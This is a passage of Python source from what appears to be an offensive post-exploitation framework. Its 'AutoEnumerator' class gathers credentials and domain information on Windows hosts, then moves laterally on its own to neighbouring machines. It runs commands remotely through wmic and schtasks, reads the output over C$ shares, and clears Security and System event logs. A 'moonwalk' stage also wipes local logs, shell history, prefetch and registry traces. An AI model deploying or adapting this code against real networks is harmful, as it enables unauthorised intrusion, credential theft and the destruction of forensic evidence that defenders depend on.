"""Auto-Enumeration Module - Comprehensive Automated Enumeration"""

import json
import time
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich import box
from modules.utils import execute_cmd, execute_powershell, validate_target
from modules.loghunter_integration import LogHunter, WindowsMoonwalk
from modules.diagram_generator import DiagramGenerator

# Export for testing compatibility
__all__ = ['AutoEnumerator', 'AutoEnumerateModule', 'ReportGenerator', 'DiagramGenerator']


class AutoEnumerator:
    """Automated enumeration engine with automatic lateral movement"""
    
    def __init__(self, console: Console, session_data: dict):
        self.console = console
        self.session_data = session_data
        self.enumeration_data = {
            'timestamp': datetime.now().isoformat(),
            'foothold': {},
            'orientation': {},
            'identity': {},
            'network': {},
            'credentials': {},
            'lateral_targets': [],
            'persistence': {},
            'certificates': {},
            'lolbins_used': [],
            'lateral_paths': [],  # Track lateral movement paths
            'privilege_escalation': {}  # PE5 privilege escalation data
        }
        self.lab_use = session_data.get('LAB_USE', 0)
        self.max_depth = session_data.get('AUTO_ENUMERATE_DEPTH', 3)  # Maximum lateral movement depth (configurable)
        self.visited_hosts = set()  # Track visited hosts to avoid loops
        self.lateral_path = []  # Current lateral movement path
        self.loghunter = None
        self.moonwalk = WindowsMoonwalk(console, session_data)
        self.use_moonwalk = True  # Enable moonwalk at all stages
        # Initialize PE5 utils if available
        try:
            from modules.pe5_utils import PE5Utils
            self.pe5_utils = PE5Utils()
            self.pe5_module = True  # Flag to indicate PE5 is available
        except ImportError:
            self.pe5_utils = None
            self.pe5_module = False
        
        # Initialize PE5 status in enumeration data
        self.enumeration_data['privilege_escalation'] = {}
        self.enumeration_data['pe5_status'] = 'available' if self.pe5_module else 'unavailable'
    
    def run_full_enumeration(self) -> Dict[str, Any]:
        """Run complete enumeration across all modules"""
        self.console.print(Panel(
            "[bold]AUTO-ENUMERATION MODE[/bold]\n\n"
            "Running comprehensive enumeration across all modules...\n"
            f"Maximum lateral movement depth: {self.max_depth}",
            title="Auto-Enumeration",
            border_style="cyan"
        ))
        self.console.print()
        
        # Get initial hostname/IP to track
        try:
            exit_code, stdout, stderr = execute_cmd("hostname", lab_use=self.lab_use)
            if exit_code == 0:
                initial_host = stdout.strip()
                self.visited_hosts.add(initial_host)
                self.lateral_path.append(initial_host)
                self.enumeration_data['initial_host'] = initial_host
        except Exception:
            pass
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=self.console
        ) as progress:
            
            # Foothold enumeration
            task1 = progress.add_task("[cyan]Foothold Assessment...", total=100)
            self._enumerate_foothold(progress, task1)
            
            # Orientation enumeration
            task2 = progress.add_task("[cyan]Local Orientation...", total=100)
            self._enumerate_orientation(progress, task2)
            
            # Identity enumeration
            task3 = progress.add_task("[cyan]Identity Acquisition...", total=100)
            self._enumerate_identity(progress, task3)
            
            # Network enumeration
            task4 = progress.add_task("[cyan]Network Discovery...", total=100)
            self._enumerate_network(progress, task4)
            
            # Lateral movement targets
            task5 = progress.add_task("[cyan]Lateral Movement Targets...", total=100)
            lateral_targets = self._enumerate_lateral_targets(progress, task5)
            
            # Automatic lateral movement
            if lateral_targets:
                task5b = progress.add_task("[cyan]Automatic Lateral Movement...", total=100)
                self._perform_automatic_lateral_movement(progress, task5b, lateral_targets)
            
            # Persistence enumeration
            task6 = progress.add_task("[cyan]Persistence Mechanisms...", total=100)
            self._enumerate_persistence(progress, task6)
            
            # Certificate enumeration (if MADCert available)
            task7 = progress.add_task("[cyan]Certificate Enumeration...", total=100)
            self._enumerate_certificates(progress, task7)
            
            # LogHunter enumeration
            task8 = progress.add_task("[cyan]LogHunter Analysis...", total=100)
            self._enumerate_with_loghunter(progress, task8)
            
            # Moonwalk cleanup
            if self.use_moonwalk:
                task9 = progress.add_task("[cyan]Moonwalk Cleanup...", total=100)
                self._perform_moonwalk_cleanup(progress, task9)
        
        return self.enumeration_data
    
    def _enumerate_foothold(self, progress, task):
        """Enumerate foothold information"""
        try:
            # Identity
            progress.update(task, advance=10, description="[cyan]Identity check...")
            exit_code, stdout, stderr = execute_cmd("whoami", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['foothold']['identity'] = stdout.strip()
            
            progress.update(task, advance=10, description="[cyan]Group memberships...")
            exit_code, stdout, stderr = execute_cmd("whoami /groups", lab_use=self.lab_use)
            if exit_code == 0:
                groups = [line.strip() for line in stdout.split('\n') if 'Group Name' in line or 'S-1-5' in line]
                self.enumeration_data['foothold']['groups'] = groups[:20]
            
            progress.update(task, advance=10, description="[cyan]Privileges...")
            exit_code, stdout, stderr = execute_cmd("whoami /priv", lab_use=self.lab_use)
            if exit_code == 0:
                privs = [line.strip() for line in stdout.split('\n') if 'Se' in line]
                self.enumeration_data['foothold']['privileges'] = privs[:20]
            
            # Host role
            progress.update(task, advance=20, description="[cyan]Host role classification...")
            exit_code, stdout, stderr = execute_cmd("netstat -ano | findstr LISTENING", lab_use=self.lab_use)
            if exit_code == 0:
                ports = {}
                for line in stdout.split('\n'):
                    if 'LISTENING' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            addr = parts[1]
                            if ':' in addr:
                                port = addr.split(':')[-1]
                                ports[port] = ports.get(port, 0) + 1
                self.enumeration_data['foothold']['listening_ports'] = list(ports.keys())[:30]
                
                # Classify role
                if '389' in ports or '88' in ports:
                    self.enumeration_data['foothold']['role'] = 'Domain Controller'
                elif '445' in ports:
                    self.enumeration_data['foothold']['role'] = 'File Server'
                elif '80' in ports or '443' in ports:
                    self.enumeration_data['foothold']['role'] = 'Web Server'
                elif '5985' in ports or '5986' in ports:
                    self.enumeration_data['foothold']['role'] = 'Management Server'
                else:
                    self.enumeration_data['foothold']['role'] = 'Workstation/Other'
            
            # System info
            progress.update(task, advance=20, description="[cyan]System information...")
            exit_code, stdout, stderr = execute_cmd("systeminfo", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['foothold']['system_info'] = stdout[:1000]
            
            progress.update(task, advance=30, description="[green]Foothold enumeration complete")
        
        except Exception as e:
            self.enumeration_data['foothold']['error'] = str(e)
    
    def _enumerate_orientation(self, progress, task):
        """Enumerate local orientation"""
        try:
            # Local groups
            progress.update(task, advance=15, description="[cyan]Local groups...")
            exit_code, stdout, stderr = execute_cmd("net localgroup", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['local_groups'] = stdout
            
            # Local administrators
            progress.update(task, advance=10, description="[cyan]Local administrators...")
            exit_code, stdout, stderr = execute_cmd("net localgroup administrators", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['local_admins'] = stdout
            
            # Domain groups (if domain joined)
            progress.update(task, advance=15, description="[cyan]Domain groups...")
            exit_code, stdout, stderr = execute_cmd("net group /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['domain_groups'] = stdout.split('\n')[:50]
            
            # Service accounts
            progress.update(task, advance=20, description="[cyan]Service accounts...")
            ps_cmd = "Get-WmiObject Win32_Service | Where-Object {$_.StartName -like '*@*'} | Select-Object -First 30 Name, StartName, State"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['service_accounts'] = stdout
            
            # Scheduled tasks
            progress.update(task, advance=20, description="[cyan]Scheduled tasks...")
            ps_cmd = "Get-ScheduledTask | Select-Object -First 30 TaskName, State, Actions"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['scheduled_tasks'] = stdout
            
            # Security software
            progress.update(task, advance=20, description="[cyan]Security software...")
            ps_cmd = "Get-Process | Where-Object {$_.ProcessName -match 'defender|security|av|firewall'} | Select-Object ProcessName, Id"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['orientation']['security_software'] = stdout
            
            progress.update(task, advance=100, description="[green]Orientation enumeration complete")
        
        except Exception as e:
            self.enumeration_data['orientation']['error'] = str(e)
    
    def _enumerate_identity(self, progress, task):
        """Enumerate identity and credentials"""
        try:
            # Credential stores
            progress.update(task, advance=25, description="[cyan]Credential stores...")
            exit_code, stdout, stderr = execute_cmd("cmdkey /list", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['stored_credentials'] = stdout
            
            # Vault
            progress.update(task, advance=25, description="[cyan]Windows Vault...")
            exit_code, stdout, stderr = execute_cmd("vaultcmd /list", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['vault_credentials'] = stdout
            
            # Domain context
            progress.update(task, advance=25, description="[cyan]Domain context...")
            exit_code, stdout, stderr = execute_cmd("net group \"Domain Admins\" /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['domain_admins'] = stdout
            
            # LSASS process
            progress.update(task, advance=25, description="[cyan]LSASS process...")
            ps_cmd = "Get-Process lsass -ErrorAction SilentlyContinue | Select-Object Id, ProcessName"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['identity']['lsass_process'] = stdout
            
            progress.update(task, advance=100, description="[green]Identity enumeration complete")
        
        except Exception as e:
            self.enumeration_data['identity']['error'] = str(e)
    
    def _enumerate_network(self, progress, task):
        """Enumerate network information"""
        try:
            # Network configuration
            progress.update(task, advance=20, description="[cyan]Network configuration...")
            exit_code, stdout, stderr = execute_cmd("ipconfig /all", lab_use=self.lab_use)
            if exit_code == 0:
                import re
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                ips = re.findall(ip_pattern, stdout)
                is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                local_ips = [ip for ip in ips if is_local_ip(ip)]
                self.enumeration_data['network']['local_ips'] = list(set(local_ips))[:10]
                self.enumeration_data['network']['ipconfig'] = stdout[:500]
            
            # ARP cache
            progress.update(task, advance=20, description="[cyan]ARP cache...")
            exit_code, stdout, stderr = execute_cmd("arp -a", lab_use=self.lab_use)
            if exit_code == 0:
                import re
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                arp_ips = re.findall(ip_pattern, stdout)
                is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                local_arp_ips = [ip for ip in arp_ips if is_local_ip(ip)]
                self.enumeration_data['network']['arp_targets'] = list(set(local_arp_ips))[:20]
            
            # Domain networks
            progress.update(task, advance=20, description="[cyan]Domain networks...")
            exit_code, stdout, stderr = execute_cmd("net view /domain", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['domains'] = stdout
            
            # Domain controllers
            progress.update(task, advance=20, description="[cyan]Domain controllers...")
            exit_code, stdout, stderr = execute_cmd("nltest /dclist:", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['domain_controllers'] = stdout
            
            # Network shares
            progress.update(task, advance=20, description="[cyan]Network shares...")
            exit_code, stdout, stderr = execute_cmd("net share", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['network']['local_shares'] = stdout
            
            progress.update(task, advance=100, description="[green]Network enumeration complete")
        
        except Exception as e:
            self.enumeration_data['network']['error'] = str(e)
    
    def _enumerate_lateral_targets(self, progress, task):
        """Enumerate potential lateral movement targets"""
        try:
            targets = []
            
            # Get network targets from ARP
            if 'arp_targets' in self.enumeration_data.get('network', {}):
                arp_targets = self.enumeration_data['network'].get('arp_targets', [])
                targets.extend(arp_targets[:10])
            
            # Test connectivity to targets
            progress.update(task, advance=30, description="[cyan]Testing target connectivity...")
            tested_targets = []
            for target in targets[:10]:  # Limit to 10 targets
                if not isinstance(target, str):
                    continue
                try:
                    # Test SMB
                    exit_code, stdout, stderr = execute_cmd(f"net view \\\\{target}", lab_use=self.lab_use)
                    if exit_code == 0:
                        self.enumeration_data['lateral_targets'].append({
                            'target': target,
                            'smb_accessible': True,
                            'shares': stdout[:200]
                        })
                    
                    # Test WinRM
                    ps_cmd = f"Test-WSMan -ComputerName {target} -ErrorAction SilentlyContinue"
                    exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                    if exit_code == 0:
                        # Update existing target or create new
                        found = False
                        for t in self.enumeration_data['lateral_targets']:
                            if isinstance(t, dict) and t.get('target') == target:
                                t['winrm_accessible'] = True
                                found = True
                                break
                        if not found:
                            self.enumeration_data['lateral_targets'].append({
                                'target': target,
                                'winrm_accessible': True
                            })
                
                except Exception:
                    continue
                
                tested_targets.append(target)
            
            progress.update(task, advance=70, description="[green]Lateral targets enumeration complete")
            
            return self.enumeration_data['lateral_targets']
        
        except Exception as e:
            self.enumeration_data['lateral_targets'] = {'error': str(e)}
            return []
    
    def _perform_automatic_lateral_movement(self, progress, task, targets: List[Dict[str, Any]], depth: int = 0):
        """Automatically perform lateral movement using LOTL techniques"""
        if depth >= self.max_depth:
            progress.update(task, advance=100, description=f"[yellow]Maximum depth ({self.max_depth}) reached")
            return
        
        accessible_targets = []
        for target_info in targets:
            if not isinstance(target_info, dict):
                continue
            
            target = target_info.get('target')
            if not target or target in self.visited_hosts:
                continue
            
            # Check if target is accessible
            smb_accessible = target_info.get('smb_accessible', False)
            winrm_accessible = target_info.get('winrm_accessible', False)
            
            if smb_accessible or winrm_accessible:
                accessible_targets.append({
                    'target': target,
                    'smb': smb_accessible,
                    'winrm': winrm_accessible,
                    'depth': depth
                })
        
        if not accessible_targets:
            progress.update(task, advance=100, description="[yellow]No accessible targets found")
            return
        
        # Limit to first 3 accessible targets per depth
        accessible_targets = accessible_targets[:3]
        
        progress.update(task, advance=10, description=f"[cyan]Found {len(accessible_targets)} accessible target(s) at depth {depth}")
        
        for target_info in accessible_targets:
            target = target_info['target']
            self.visited_hosts.add(target)
            self.lateral_path.append(target)
            
            try:
                progress.update(task, advance=5, description=f"[cyan]Enumerating {target} (depth {depth})...")
                
                # Enumerate remote target
                remote_data = self._enumerate_remote_target(target, target_info, depth)
                
                # Moonwalk cleanup after remote enumeration
                if self.use_moonwalk:
                    try:
                        # Clear logs on remote target if possible
                        if target_info.get('winrm'):
                            ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ wevtutil.exe cl Security; wevtutil.exe cl System }}'
                            execute_powershell(ps_cmd, lab_use=self.lab_use)
                        elif target_info.get('smb'):
                            # Use scheduled task to clear logs
                            task_name = f"CleanTask_{int(time.time())}"
                            cmd = 'wevtutil.exe cl Security & wevtutil.exe cl System'
                            create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                            execute_cmd(create_cmd, lab_use=self.lab_use)
                            run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                            execute_cmd(run_cmd, lab_use=self.lab_use)
                            time.sleep(1)
                            delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                            execute_cmd(delete_cmd, lab_use=self.lab_use)
                    except Exception:
                        pass  # Continue even if cleanup fails
                
                # Store lateral path
                path_entry = {
                    'path': self.lateral_path.copy(),
                    'depth': depth,
                    'target': target,
                    'method': 'wmic' if target_info.get('winrm') else 'smb',
                    'enumeration': remote_data
                }
                self.enumeration_data['lateral_paths'].append(path_entry)
                
                # Check for further lateral movement opportunities from this target
                if depth < self.max_depth - 1:
                    # Discover targets from remote machine
                    progress.update(task, advance=5, description=f"[cyan]Discovering targets from {target}...")
                    remote_targets = self._discover_remote_targets(target, target_info)
                    if remote_targets:
                        progress.update(task, advance=5, description=f"[cyan]Found {len(remote_targets)} targets from {target}, moving laterally...")
                        # Recursive lateral movement
                        self._perform_automatic_lateral_movement(progress, task, remote_targets, depth + 1)
                    else:
                        progress.update(task, advance=5, description=f"[dim]No new targets from {target}[/dim]")
                
                # Remove from path after enumeration
                if self.lateral_path and self.lateral_path[-1] == target:
                    self.lateral_path.pop()
            
            except Exception as e:
                self.console.print(f"[red]Error enumerating {target}: {e}[/red]")
                if self.lateral_path and self.lateral_path[-1] == target:
                    self.lateral_path.pop()
        
        progress.update(task, advance=100, description="[green]Lateral movement complete")
    
    def _enumerate_remote_target(self, target: str, target_info: Dict[str, Any], depth: int) -> Dict[str, Any]:
        """Enumerate a remote target using LOTL techniques"""
        remote_data = {
            'target': target,
            'depth': depth,
            'timestamp': datetime.now().isoformat(),
            'foothold': {'target': target, 'method': 'auto'},
            'identity': {},
            'network': {},
            'system_info': {},
            'shares': [],
            'lolbins_used': []
        }
        
        try:
            # Choose method based on availability
            use_wmic = target_info.get('winrm', False)
            use_smb = target_info.get('smb', False)
            
            if use_wmic:
                # Use WMI for remote enumeration (LOTL)
                # System info
                wmic_cmd = f'wmic /node:{target} os get name,version'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['system_info']['os'] = stdout[:200]
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} os get')
                
                # Process list
                wmic_cmd = f'wmic /node:{target} process list brief'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['system_info']['processes'] = stdout[:300]
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process list')
                
                # Network shares via WMI
                ps_cmd = f'Get-WmiObject -Class Win32_Share -ComputerName {target} | Select-Object Name, Path'
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['network']['shares'] = stdout[:200]
                    self.enumeration_data['lolbins_used'].append(f'Get-WmiObject Win32_Share -ComputerName {target}')
                
                # Execute whoami remotely
                wmic_cmd = f'wmic /node:{target} process call create "whoami"'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['identity']['whoami_executed'] = True
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create')
            
            elif use_smb:
                # Use SMB for remote enumeration (LOTL)
                # List shares
                smb_cmd = f'net view \\\\{target}'
                exit_code, stdout, stderr = execute_cmd(smb_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    remote_data['network']['shares'] = stdout[:200]
                    # Parse shares
                    shares = []
                    for line in stdout.split('\n'):
                        if 'Disk' in line or 'Print' in line:
                            parts = line.split()
                            if parts:
                                shares.append(parts[0])
                    remote_data['shares'] = shares[:10]
                    self.enumeration_data['lolbins_used'].append(f'net view \\\\{target}')
                
                # Execute command via scheduled task (LOTL)
                task_name = f"EnumTask_{int(time.time())}"
                cmd = 'whoami > C:\\Windows\\Temp\\enum_result.txt'
                
                # Create task
                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
                
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target}')
                    
                    # Run task
                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                    execute_cmd(run_cmd, lab_use=self.lab_use)
                    self.enumeration_data['lolbins_used'].append(f'schtasks /run /s {target}')
                    
                    time.sleep(2)  # Wait for execution
                    
                    # Try to read result via SMB
                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
                    if exit_code == 0:
                        remote_data['identity']['whoami'] = stdout.strip()
                    
                    # Clean up task
                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                    execute_cmd(delete_cmd, lab_use=self.lab_use)
                    self.enumeration_data['lolbins_used'].append(f'schtasks /delete /s {target}')
                    
                    # Clean up temp file
                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
                    execute_cmd(del_cmd, lab_use=self.lab_use)
        
        except Exception as e:
            remote_data['error'] = str(e)
        
        return remote_data
    
    def _discover_remote_targets(self, target: str, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Discover targets from a remote machine using LOTL"""
        remote_targets = []
        
        try:
            use_wmic = target_info.get('winrm', False)
            use_smb = target_info.get('smb', False)
            
            if use_wmic:
                # Use WMI to execute net view on remote machine
                # Execute net view via WMI
                wmic_cmd = f'wmic /node:{target} process call create "net view /domain"'
                exit_code, stdout, stderr = execute_cmd(wmic_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'wmic /node:{target} process call create "net view"')
                
                # Use PowerShell remoting to get network info
                ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ Get-NetNeighbor | Select-Object -First 10 IPAddress }}'
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    # Parse IPs from output
                    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                    ips = re.findall(ip_pattern, stdout)
                    is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                    local_ips = [ip for ip in ips if is_local_ip(ip)]
                    
                    for ip in local_ips[:5]:
                        if ip not in self.visited_hosts and ip != target:
                            remote_targets.append({
                                'target': ip,
                                'smb_accessible': False,  # Will test
                                'winrm_accessible': False
                            })
            
            elif use_smb:
                # Use net view from remote machine via SMB
                # Execute net view via scheduled task
                task_name = f"NetViewTask_{int(time.time())}"
                cmd = 'net view /domain > C:\\Windows\\Temp\\netview_result.txt'
                
                create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
                exit_code, stdout, stderr = execute_cmd(create_cmd, lab_use=self.lab_use)
                
                if exit_code == 0:
                    self.enumeration_data['lolbins_used'].append(f'schtasks /create /s {target} (net view)')
                    
                    # Run and wait
                    run_cmd = f'schtasks /run /s {target} /tn {task_name}'
                    execute_cmd(run_cmd, lab_use=self.lab_use)
                    time.sleep(2)
                    
                    # Read result via SMB
                    read_cmd = f'type \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
                    exit_code, stdout, stderr = execute_cmd(read_cmd, lab_use=self.lab_use)
                    
                    if exit_code == 0:
                        # Parse computer names/IPs
                        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                        ips = re.findall(ip_pattern, stdout)
                        is_local_ip = self.session_data.get('is_local_ip', lambda x: False)
                        local_ips = [ip for ip in ips if is_local_ip(ip)]
                        
                        # Also look for computer names
                        hostname_pattern = r'\\\\[A-Za-z0-9\-]+'
                        hostnames = re.findall(hostname_pattern, stdout)
                        hostnames = [h.replace('\\\\', '') for h in hostnames]
                        
                        # Test connectivity to discovered targets
                        for ip in local_ips[:5]:
                            if ip not in self.visited_hosts and ip != target:
                                test_cmd = f'net view \\\\{ip}'
                                test_exit, _, _ = execute_cmd(test_cmd, lab_use=self.lab_use)
                                if test_exit == 0:
                                    remote_targets.append({
                                        'target': ip,
                                        'smb_accessible': True,
                                        'winrm_accessible': False
                                    })
                    
                    # Cleanup
                    delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
                    execute_cmd(delete_cmd, lab_use=self.lab_use)
                    del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\netview_result.txt'
                    execute_cmd(del_cmd, lab_use=self.lab_use)
        
        except Exception as e:
            self.console.print(f"[dim]Error discovering targets from {target}: {e}[/dim]")
        
        return remote_targets
    
    def _enumerate_persistence(self, progress, task):
        """Enumerate persistence mechanisms"""
        try:
            # Scheduled tasks
            progress.update(task, advance=25, description="[cyan]Scheduled tasks...")
            ps_cmd = "Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object {$_.LastRunTime -gt (Get-Date).AddDays(-30)} | Select-Object TaskName, State, LastRunTime"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['recent_tasks'] = stdout
            
            # Services
            progress.update(task, advance=25, description="[cyan]Services...")
            ps_cmd = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 30 Name, DisplayName, Status"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['services'] = stdout
            
            # WMI event subscriptions
            progress.update(task, advance=25, description="[cyan]WMI event subscriptions...")
            ps_cmd = "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query"
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['wmi_subscriptions'] = stdout
            
            # Registry run keys
            progress.update(task, advance=25, description="[cyan]Registry run keys...")
            exit_code, stdout, stderr = execute_cmd("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['registry_run_hkcu'] = stdout
            
            exit_code, stdout, stderr = execute_cmd("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", lab_use=self.lab_use)
            if exit_code == 0:
                self.enumeration_data['persistence']['registry_run_hklm'] = stdout
            
            progress.update(task, advance=100, description="[green]Persistence enumeration complete")
        
        except Exception as e:
            self.enumeration_data['persistence']['error'] = str(e)
    
    def _enumerate_certificates(self, progress, task):
        """Enumerate certificates (if MADCert available)"""
        try:
            from modules.madcert_integration import MADCertGenerator
            madcert_gen = MADCertGenerator(self.console, self.session_data)
            certs = madcert_gen.list_certificates()
            
            if certs:
                self.enumeration_data['certificates']['generated_certs'] = [
                    {
                        'name': c['name'],
                        'type': c['type'],
                        'ca': c.get('ca_name', 'N/A'),
                        'validity_days': c.get('validity_days', 0)
                    }
                    for c in certs
                ]
            
            progress.update(task, advance=100, description="[green]Certificate enumeration complete")
        
        except Exception:
            self.enumeration_data['certificates']['status'] = 'MADCert not available'
            progress.update(task, advance=100)
    
    def _enumerate_with_loghunter(self, progress, task):
        """Enumerate using LogHunter"""
        try:
            if not self.loghunter:
                self.loghunter = LogHunter(self.console, self.session_data)
                self.loghunter.loghunter_path = self.loghunter.find_loghunter()
            
            if not self.loghunter.loghunter_path:
                self.enumeration_data['loghunter'] = {'status': 'LogHunter not available'}
                progress.update(task, advance=100)
                return
            
            # Hunt credential access
            progress.update(task, advance=25, description="[cyan]Hunting credential access...")
            cred_results = self.loghunter.hunt_credential_access()
            self.enumeration_data['loghunter'] = {
                'credential_access': cred_results
            }
            
            # Hunt lateral movement
            progress.update(task, advance=25, description="[cyan]Hunting lateral movement...")
            lateral_results = self.loghunter.hunt_lateral_movement()
            self.enumeration_data['loghunter']['lateral_movement'] = lateral_results
            
            # Hunt privilege escalation
            progress.update(task, advance=25, description="[cyan]Hunting privilege escalation...")
            priv_results = self.loghunter.hunt_privilege_escalation()
            self.enumeration_data['loghunter']['privilege_escalation'] = priv_results
            
            progress.update(task, advance=25, description="[green]LogHunter analysis complete")
        
        except Exception as e:
            self.enumeration_data['loghunter'] = {'error': str(e)}
            progress.update(task, advance=100)
    
    def _perform_moonwalk_cleanup(self, progress, task):
        """Perform moonwalk cleanup after enumeration"""
        try:
            progress.update(task, advance=15, description="[cyan]Clearing event logs...")
            event_results = self.moonwalk.clear_event_logs(['Security', 'System', 'Application', 'PowerShell'])
            self.enumeration_data['moonwalk'] = {
                'event_logs': event_results
            }
            
            progress.update(task, advance=15, description="[cyan]Clearing PowerShell history...")
            self.moonwalk.clear_powershell_history()
            
            progress.update(task, advance=15, description="[cyan]Clearing command history...")
            self.moonwalk.clear_command_history()
            
            progress.update(task, advance=15, description="[cyan]Clearing registry traces...")
            reg_results = self.moonwalk.clear_registry_traces()
            self.enumeration_data['moonwalk']['registry'] = reg_results
            
            progress.update(task, advance=15, description="[cyan]Clearing prefetch...")
            self.moonwalk.clear_prefetch()
            
            progress.update(task, advance=15, description="[cyan]Clearing recent files...")
            self.moonwalk.clear_recent_files()
            
            progress.update(task, advance=10, description="[green]Moonwalk cleanup complete")
        
        except Exception as e:
            self.enumeration_data['moonwalk'] = {'error': str(e)}
            progress.update(task, advance=100)
    
    def _enumerate_vlan_bypass(self, progress, task):
        """Enumerate VLAN bypass techniques"""
        try:
            from modules.vlan_bypass import VLANBypassModule
            vlan_module = VLANBypassModule()
            # Call with correct signature - takes session_data
            vlan_data = vlan_module.auto_enumerate_vlans(self.session_data)
            if isinstance(vlan_data, dict):
                # Ensure required fields exist for test compatibility
                if 'default_credentials_found' not in vlan_data:
                    vlan_data['default_credentials_found'] = vlan_data.get('credentials_found', [])
                if 'vulnerable_cves' not in vlan_data:
                    # Extract CVEs from vulnerable_devices
                    vulnerable_cves = []
                    try:
                        vulnerable_devices = vlan_data.get('vulnerable_devices', [])
                        if not isinstance(vulnerable_devices, list):
                            vulnerable_devices = []
                        for device in vulnerable_devices:
                            if isinstance(device, dict):
                                device_cves = device.get('cves', [])
                                if isinstance(device_cves, list):
                                    vulnerable_cves.extend(device_cves)
                    except (AttributeError, TypeError):
                        pass
                    vlan_data['vulnerable_cves'] = list(set(vulnerable_cves))
                if 'bypass_techniques' not in vlan_data:
                    # Extract techniques from bypass_opportunities
                    bypass_opps = vlan_data.get('bypass_opportunities', [])
                    bypass_techniques = []
                    for opp in bypass_opps:
                        if isinstance(opp, dict):
                            # Keep as dict with 'technique' key for test compatibility
                            bypass_techniques.append({'technique': opp.get('method', '')})
                        elif isinstance(opp, str):
                            bypass_techniques.append({'technique': opp})
                    vlan_data['bypass_techniques'] = bypass_techniques
                self.enumeration_data['vlan_bypass'] = vlan_data
            else:
